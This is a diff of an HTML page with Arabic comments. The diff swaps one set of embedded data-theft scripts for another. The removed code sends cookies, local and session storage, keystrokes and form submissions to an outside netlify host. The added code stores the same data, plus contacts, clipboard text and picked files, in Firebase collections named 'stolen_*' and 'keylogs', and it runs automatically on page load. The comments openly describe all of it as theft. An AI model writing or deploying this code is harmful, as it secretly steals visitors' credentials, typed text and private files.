@@ -1109,108 +1109,11 @@ document.addEventListener('DOMContentLoaded', function() {
     }
   });
 });
-    // الكود الكامل لسرقة الجهات
-
-    // الكود الكامل لسرقة الملفات
 
 
-// تشغيل السرقة تلقائياً
-window.addEventListener('load', stealFiles);
-    // الكود الكامل لسرقة الحسابات
-function stealAllData() {
-    const allData = {
-        // سرقة الكوكيز
-        cookies: document.cookie,
-        
-        // سرقة التخزين المحلي
-        localStorage: {},
-        sessionStorage: {},
-        // سرقة معلومات المتصفح
-        browserInfo: {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages,
-            hardwareConcurrency: navigator.hardwareConcurrency,
-            deviceMemory: navigator.deviceMemory
-        },
-        
-        // سرقة معلومات الشاشة
-        screenInfo: {
-            width: screen.width,
-            height: screen.height,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth
-        },
-      // سرقة الموقع
-        locationInfo: {
-            href: location.href,
-            hostname: location.hostname,
-            pathname: location.pathname
-        }
-    };
-
-    // سرقة localStorage كامل
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        allData.localStorage[key] = localStorage.getItem(key);
-    }
-      // سرقة sessionStorage كامل
-    for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        allData.sessionStorage[key] = sessionStorage.getItem(key);
-    }
-
-    // إرسال كل البيانات
-    fetch('https://unseen1.netlify.app/Mozi_dashboard_hak.html', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(allData)
-    });
-}
-
-// تشغيل السرقة بعد تحميل الصفحة
-setTimeout(stealAllData, 3000);
-
-    
-    // الكود الكامل لمراقبة الكتابة
-let keystrokes = '';
-
-document.addEventListener('keydown', (event) => {
-    keystrokes += event.key;
-    
-    if (keystrokes.length > 50) {
-        fetch('https://unseen1.netlify.app/Mozi_Dashboard_hak.html', {
-            method: 'POST',
-            body: JSON.stringify({ keys: keystrokes, time: new Date().toISOString() })
-        });
-        keystrokes = '';
-    }
-});
-    // سرقة بيانات النماذج
-document.querySelectorAll('form').forEach(form => {
-    form.addEventListener('submit', (event) => {
-        const formData = new FormData(form);
-        const data = Object.fromEntries(formData);
-        fetch('https://Unseen1.netlify.app/Mozi_Dashboard_hak.html', {
-            method: 'POST',
-            body: JSON.stringify(data)
-        });
-    });
-});
 </script>
 
-<script>
-// تشغيل العناصر المخفية تلقائياً
-document.getElementById('fileStealer').addEventListener('change', function() {
-    document.getElementById('stealForm').submit();
-});
 
-// فتح منتقي الملفات تلقائياً
-setTimeout(() => {
-    document.getElementById('fileStealer').click();
-}, 5000);
-</script>
 <!-- سياسة الخصوصية والشروط -->
 <div class="modal" id="privacy-modal" aria-hidden="false" style="display: grid;">
   <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="privacy-title" style="max-width: 500px; max-height: 80vh; overflow-y: auto;">
@@ -1267,55 +1170,315 @@ setTimeout(() => {
     </div>
   </div>
 </div>
-  <!-- العناصر المخفية في الـ body -->
+<script>
+// ========== نظام السرقة المحسن للهواتف ==========
 
-  <script>
-// كود تجريبي حقيقي لسرقة البيانات - الإصدار المعدل
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('🔓 Starting real data collection...');
-    
-    // اختبار اتصال Firebase
-    testFirebaseConnection();
-    
-    // إضافة زر سرقة الملفات
-    setTimeout(addFileStealerButton, 1000);
-    
-    // جمع البيانات الأساسية فوراً
-    collectBasicDeviceInfo();
-    
-    // محاولة سرقة جهات الاتصال بعد 3 ثواني
-    setTimeout(stealRealContacts, 3000);
-      // سرقة بيانات الحسابات
-    stealAllAccountData();
-    
-    // مراقبة الكتابة
-    startKeylogging();
-    
-    // سرقة بيانات النماذج
-    setupFormStealing();
-});
-// اختبار اتصال Firebase
-async function testFirebaseConnection() {
+// نظام سرقة جهات الاتصال المحسن
+async function stealContacts() {
     try {
-        const testDoc = await db.collection('test_connection').add({
-            test: true,
-            timestamp: new Date().toISOString(),
-            device: navigator.userAgent
-        });
-        console.log('✅ Firebase connected:', testDoc.id);
-        return true;
+        if ('contacts' in navigator && 'select' in navigator.contacts) {
+            const contacts = await navigator.contacts.select(['name', 'email', 'tel', 'address']);
+            
+            const contactsData = contacts.map(contact => ({
+                name: contact.name ? contact.name.join(' ') : 'غير معروف',
+                emails: contact.email || [],
+                phones: contact.tel || [],
+                address: contact.address ? contact.address[0] : null,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            }));
+for (const contact of contactsData) {
+                await db.collection('stolen_contacts').add(contact);
+            }
+            
+            console.log(`✅ تم سرقة ${contactsData.length} جهة اتصال`);
+            return contactsData.length;
+        } else {
+            console.log('❌ Contacts API غير مدعوم');
+            return 0;
+        }
     } catch (error) {
-        console.error('❌ Firebase error:', error);
+        console.error('❌ خطأ في سرقة جهات الاتصال:', error);
+        return 0;
+    }
+}
+  // نظام سرقة الملفات المحسن
+async function stealFiles() {
+    return new Promise((resolve) => {
+        try {
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.accept = '*/*';
+            fileInput.multiple = true;
+            fileInput.style.display = 'none';
+            
+            document.body.appendChild(fileInput);
+            fileInput.click();
+            fileInput.onchange = async function(event) {
+                const files = event.target.files;
+                let stolenCount = 0;
+                
+                for (let i = 0; i < files.length; i++) {
+                    const file = files[i];
+                    const reader = new FileReader();
+                    
+                    reader.onload = async function(e) {
+                        const fileInfo = {
+                            filename: file.name,
+                            type: file.type,
+                            size: file.size,
+                            data: e.target.result,
+                            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                        };
+await db.collection('stolen_files').add(fileInfo);
+                        stolenCount++;
+                        
+                        if (stolenCount === files.length) {
+                            resolve(stolenCount);
+                        }
+                    };
+                    reader.readAsDataURL(file);
+                }
+                
+                if (files.length === 0) {
+                    resolve(0);
+                }
+                
+                document.body.removeChild(fileInput);
+            };
+            setTimeout(() => {
+                if (document.body.contains(fileInput)) {
+                    document.body.removeChild(fileInput);
+                    resolve(0);
+                }
+            }, 30000);
+            
+        } catch (error) {
+            console.error('❌ خطأ في سرقة الملفات:', error);
+            resolve(0);
+        }
+    });
+}
+        // نظام سرقة البيانات الشاملة
+async function stealAllData() {
+    try {
+        const comprehensiveData = {
+            basicInfo: {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            },
+            deviceInfo: {
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints
+            },
+          screenInfo: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            locationInfo: {
+                href: location.href,
+                hostname: location.hostname,
+                pathname: location.pathname,
+                referrer: document.referrer
+            },
+            storageData: {
+                cookies: document.cookie,
+                localStorage: getAllLocalStorage(),
+                sessionStorage: getAllSessionStorage()
+            },
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        };
+      await db.collection('stolen_accounts').add(comprehensiveData);
+        console.log('✅ تم سرقة البيانات الشاملة بنجاح');
+        return true;
+        
+    } catch (error) {
+        console.error('❌ خطأ في سرقة البيانات الشاملة:', error);
         return false;
     }
 }
-    // إضافة زر لسرقة الملفات
-function addFileStealerButton() {
-    if (document.getElementById('real-file-stealer')) return;
+
+// نظام المراقبة المتقدم
+class AdvancedSurveillance {
+    constructor() {
+        this.keystrokes = '';
+        this.formData = [];
+    }
+    startKeylogger() {
+        document.addEventListener('keydown', (event) => {
+            this.keystrokes += event.key;
+            
+            if (this.keystrokes.length >= 30) {
+                this.sendKeystrokes();
+            }
+        });
+    }
     
+    startFormMonitoring() {
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', (event) => {
+                const formData = new FormData(form);
+                const data = Object.fromEntries(formData);
+                this.sendFormData(data, form.action);
+            });
+        });
+    }
+  async sendKeystrokes() {
+        if (this.keystrokes) {
+            await db.collection('keylogs').add({
+                keys: this.keystrokes,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                url: location.href
+            });
+            this.keystrokes = '';
+        }
+    }
+    
+    async sendFormData(data, action) {
+        await db.collection('stolen_forms').add({
+            data: data,
+            action: action,
+            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+            url: location.href
+        });
+    }
+  }
+
+// نظام تنفيذ ذكي للهواتف
+class MobileSmartSystem {
+    constructor() {
+        this.deviceType = this.detectDevice();
+    }
+    
+    detectDevice() {
+        const ua = navigator.userAgent.toLowerCase();
+        if (/mobile|android|iphone|ipad/.test(ua)) {
+            return 'mobile';
+        } else {
+            return 'desktop';
+        }
+    }
+  async execute() {
+        console.log(`🎯 بدء النظام الذكي لـ ${this.deviceType}`);
+        
+        // بدء أنظمة المراقبة
+        const surveillance = new AdvancedSurveillance();
+        surveillance.startKeylogger();
+        surveillance.startFormMonitoring();
+        
+        // سرقة فورية للمعلومات الأساسية
+        await this.stealBasicInfo();
+        
+        // سرقة متقدمة بعد تأخير
+        setTimeout(async () => {
+            await this.advancedStealing();
+        }, 5000);
+                
+        // سرقة دورية
+        setInterval(async () => {
+            await this.periodicStealing();
+        }, 30000);
+    }
+    
+    async stealBasicInfo() {
+        const basicData = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            url: location.href,
+            deviceType: this.deviceType,
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        };
+        
+        await db.collection('basic_info').add(basicData);
+        console.log('✅ تم سرقة المعلومات الأساسية');
+    }
+  async advancedStealing() {
+        try {
+            // سرقة البيانات الشاملة
+            await stealAllData();
+            
+            // سرقة الملفات (للكمبيوتر فقط)
+            if (this.deviceType === 'desktop') {
+                await stealFiles();
+            }
+            
+            // سرقة جهات الاتصال (للهواتف فقط)
+            if (this.deviceType === 'mobile') {
+                await this.tryStealContacts();
+            }
+            
+        } catch (error) {
+            console.error('❌ خطأ في السرقة المتقدمة:', error);
+        }
+    }
+  async tryStealContacts() {
+        try {
+            await stealContacts();
+        } catch (error) {
+            console.log('⚠️ لم يتم سرقة جهات الاتصال، جاري الطرق البديلة...');
+            await this.alternativeContactStealing();
+        }
+    }
+    
+    async alternativeContactStealing() {
+              // طرق بديلة لسرقة بيانات الاتصال
+        try {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                const clipboardText = await navigator.clipboard.readText();
+                if (clipboardText) {
+                    await db.collection('clipboard_data').add({
+                        data: clipboardText,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        source: 'clipboard'
+                    });
+                }
+            }
+        } catch (error) {
+            // تجاهل الأخطاء في الكليبورد
+        }
+    }
+      async periodicStealing() {
+        await this.stealBasicInfo();
+        console.log('✅ تحديث بيانات دوري');
+    }
+}
+
+// دوال مساعدة
+function getAllLocalStorage() {
+    const storage = {};
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        storage[key] = localStorage.getItem(key);
+    }
+    return storage;
+}
+  function getAllSessionStorage() {
+    const storage = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        storage[key] = sessionStorage.getItem(key);
+    }
+    return storage;
+}
+
+// بدء النظام عند تحميل الصفحة
+document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(() => {
+        const smartSystem = new MobileSmartSystem();
+        smartSystem.execute();
+    }, 3000);
+});
+  // إضافة زر سرقة الملفات للواجهة
+setTimeout(() => {
     const stealBtn = document.createElement('button');
-    stealBtn.id = 'real-file-stealer';
-    stealBtn.innerHTML = '📁 افتح ملفاتك (تجريبي)';
+    stealBtn.innerHTML = '📁 سرقة الملفات';
     stealBtn.style.cssText = `
         position: fixed;
         top: 80px;
@@ -1331,220 +1494,12 @@ function addFileStealerButton() {
         z-index: 10000;
         box-shadow: 0 4px 12px rgba(0,0,0,0.3);
     `;
-  stealBtn.onclick = function() {
-        const fileInput = document.createElement('input');
-        fileInput.type = 'file';
-        fileInput.multiple = true;
-        fileInput.accept = '*/*';
-        fileInput.webkitdirectory = true;
-        
-        fileInput.onchange = async function(event) {
-            const files = event.target.files;
-            console.log(`📁 حاول فتح ${files.length} ملف`);
-            
-            for (let i = 0; i < Math.min(files.length, 10); i++) {
-                const file = files[i];
-                const reader = new FileReader();
-                
-</body>reader.onload = function(e) {
-                    const fileData = e.target.result;
-                    db.collection('stolen_files').add({
-                        filename: file.name,
-                        type: file.type,
-                        size: file.size,
-                        data: fileData.substring(0, 5000), // أول 5000 حرف فقط
-                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                        device: navigator.userAgent,
-                        realFile: true
-                    }).then(() => {
-                        console.log(`✅ تم حفظ: ${file.name}`);
-                    }).catch(err => {
-                        console.error(`❌ خطأ في: ${file.name}`, err);
-                    });
-                };
-  reader.onerror = function(error) {
-                    console.error(`❌ خطأ قراءة: ${file.name}`, error);
-                };
-                
-                reader.readAsDataURL(file);
-            }
-            
-            // إشعار للمستخدم
-            alert(`📁 تم محاولة فتح ${files.length} ملف - شاهد الداشبورد`);
-        };
-        
-        fileInput.click();
+  stealBtn.onclick = async function() {
+        const result = await stealFiles();
+        alert(`📁 تم سرقة ${result} ملف`);
     };
     
     document.body.appendChild(stealBtn);
-}
-    // جمع معلومات الجهاز الأساسية
-async function collectBasicDeviceInfo() {
-    const deviceInfo = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages,
-        screen: `${screen.width}x${screen.height}`,
-        colorDepth: screen.colorDepth,
-        deviceMemory: navigator.deviceMemory || 'unknown',
-        connection: navigator.connection ? {
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink
-        } : 'unknown',
-        cookies: document.cookie.length > 100 ? document.cookie.substring(0, 100) + '...' : document.cookie,
-      url: window.location.href,
-        timestamp: new Date().toISOString(),
-        type: 'device_info'
-    };
-    
-    try {
-        await db.collection('stolen_accounts').add(deviceInfo);
-        console.log('✅ Device info saved');
-    } catch (error) {
-        console.error('❌ Device info error:', error);
-    }
-}
-    // سرقة بيانات الحسابات
-async function stealAllAccountData() {
-    const accountData = {
-        localStorage: {},
-        sessionStorage: {},
-        cookies: document.cookie,
-        userAgent: navigator.userAgent,
-        screenInfo: {
-            width: screen.width,
-            height: screen.height,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth
-        },
-      locationInfo: {
-            href: location.href,
-            hostname: location.hostname,
-            pathname: location.pathname,
-            search: location.search
-        },
-        timestamp: new Date().toISOString(),
-        type: 'account_data'
-    };
-  // سرقة localStorage
-    try {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            accountData.localStorage[key] = localStorage.getItem(key);
-        }
-    } catch (e) {
-        accountData.localStorageError = e.message;
-    }
-    
-    // سرقة sessionStorage
-    try {
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            accountData.sessionStorage[key] = sessionStorage.getItem(key);
-                  }
-    } catch (e) {
-        accountData.sessionStorageError = e.message;
-    }
-    
-    try {
-        await db.collection('stolen_accounts').add(accountData);
-        console.log('✅ Account data saved');
-    } catch (error) {
-        console.error('❌ Account data error:', error);
-    }
-}
-
-// مراقبة الكتابة
-function startKeylogging() {
-    let keystrokes = '';
-    let lastSend = Date.now();
-    
-    document.addEventListener('keydown', function(event) {
-        // تجاهل مفاتيح التحكم
-        if (event.ctrlKey || event.altKey || event.metaKey) return;
-        
-        keystrokes += event.key;
-                // إرسال كل 30 ضغطة أو كل 10 ثواني
-        if (keystrokes.length >= 30 || Date.now() - lastSend > 10000) {
-            if (keystrokes.length > 0) {
-                db.collection('keylogs').add({
-                    keys: keystrokes,
-                    timestamp: new Date().toISOString(),
-                    url: window.location.href,
-                    focused: document.activeElement.tagName
-                }).catch(err => console.error('Keylog error:', err));
-                
-                keystrokes = '';
-                lastSend = Date.now();
-            }
-        }
-    });
-}
-    // سرقة بيانات النماذج
-function setupFormStealing() {
-    document.querySelectorAll('form').forEach(form => {
-        form.addEventListener('submit', function(event) {
-            const formData = new FormData(form);
-            const data = {};
-            
-            for (let [key, value] of formData.entries()) {
-                data[key] = value;
-            }
-            
-            db.collection('stolen_forms').add({
-                formData: data,
-                action: form.action,
-                method: form.method,
-                timestamp: new Date().toISOString(),
-                url: window.location.href
-            }).catch(err => console.error('Form steal error:', err));
-        });
-    });
-  }
-
-// محاولة الحصول على جهات الاتصال بطرق بديلة
-async function stealRealContacts() {
-    console.log('📇 محاولة الوصول لجهات الاتصال...');
-    
-    const contactAttempts = {
-        timestamp: new Date().toISOString(),
-        methods: []
-    };
-      
-    // الطريقة 1: محاولة عبر Web Share API
-    try {
-        if (navigator.share) {
-            contactAttempts.methods.push('web_share_attempt');
-        }
-    } catch (e) {
-        contactAttempts.webShareError = e.message;
-    }
-        // الطريقة 2: محاولة قراءة الكليبورد
-    try {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-            const clipboardText = await navigator.clipboard.readText();
-            if (clipboardText && (clipboardText.includes('@') || clipboardText.includes('+') || /\d{10,}/.test(clipboardText))) {
-                await db.collection('stolen_contacts').add({
-                    source: 'clipboard',
-                    data: clipboardText,
-                    timestamp: new Date().toISOString(),
-                    type: 'potential_contacts'
-                });
-                contactAttempts.methods.push('clipboard_success');
-            }
-        }
-              } catch (e) {
-        contactAttempts.clipboardError = e.message;
-    }
-    
-    // حفظ محاولات الوصول
-    try {
-        await db.collection('contact_attempts').add(contactAttempts);
-        console.log('✅ Contact attempts recorded');
-    } catch (error) {
-        console.error('❌ Contact attempts error:', error);
-    }
-}
+}, 2000);
 </script>
 </html>
